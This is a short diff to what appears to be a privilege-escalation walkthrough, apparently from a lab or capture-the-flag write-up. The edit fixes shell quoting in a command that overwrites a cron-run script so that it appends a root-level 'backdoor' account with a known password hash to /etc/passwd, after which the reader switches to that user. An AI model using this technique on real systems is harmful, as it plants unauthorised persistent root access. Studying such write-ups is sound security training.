@@ -227,7 +227,7 @@ openssl passwd -1 -salt testing password
 Overwrite the script:
 
 ```bash
-echo 'echo "backdoor:$1$testing$kpXRXeZB3lyty62FzTkuA1:0:0:root:/root:/bin/bash" >> /etc/passwd' > /var/backups/script.sh
+printf "echo 'backdoor:\$1\$testing\$kpXRXeZB3lyty62FzTkuA1:0:0:root:/root:/bin/bash' >> /etc/passwd\n" > /var/backups/script.sh
 ```
 
 Wait up to one minute for the cron to fire, then switch to the backdoor user:
